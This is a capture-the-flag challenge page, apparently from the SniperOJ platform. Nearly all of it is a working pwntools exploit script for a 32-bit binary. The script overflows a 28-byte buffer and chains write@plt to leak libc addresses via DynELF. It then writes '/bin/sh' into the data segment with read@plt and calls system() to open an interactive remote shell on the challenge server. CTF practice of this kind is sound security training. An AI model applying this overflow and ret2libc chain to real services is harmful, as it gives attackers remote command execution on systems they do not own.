#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20003

#### Solution
```python
#!/usr/bin/env python
# coding:utf-8

from pwn import *

'''
config
'''
def read_output():
    Io.recvuntil("Dancing in shackles, Right?\n")

junk_size = 28
write_plt = p32(0x08048390)
start_addr = p32(0x080483c0)
read_plt = p32(0x08048360)
data_addr = 0x0804a020


# Io = process("./leak")
Io = remote("www.sniperoj.cn", 30006)

def leak(addr):
    read_output()
    junk = "A" * 28
    count = p32(4)
    buf = p32(addr)
    fd = p32(1)
    payload = junk + write_plt + start_addr + fd + buf + count
    Io.send(payload)
    leaked = Io.recv(4)
    print "[%s] -> [%s] = [%s]" % (hex(addr), hex(u32(leaked)),  repr(leaked))
    return leaked

# leak the address of system()
d = DynELF(leak, elf=ELF("./leak"))
system_addr = d.lookup('system', 'libc')
print "[system()] -> [%s]" % (hex(system_addr))

# write /bin/sh
junk = "A" * junk_size
count = p32(8)
buf = p32(data_addr)
fd = p32(0)
payload = junk + read_plt + start_addr + fd + buf + count
Io.send(payload)

# send /bin/sh
Io.send("/bin/sh\x00")

# call system
read_output()
junk = "A" * junk_size
system_addr = p32(system_addr)
null_addr = p32(0xFFFFFFFF) # who care ?
bin_sh_addr = p32(data_addr)
payload = junk + system_addr + null_addr + bin_sh_addr
Io.send(payload)

# interactive()
Io.interactive()
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

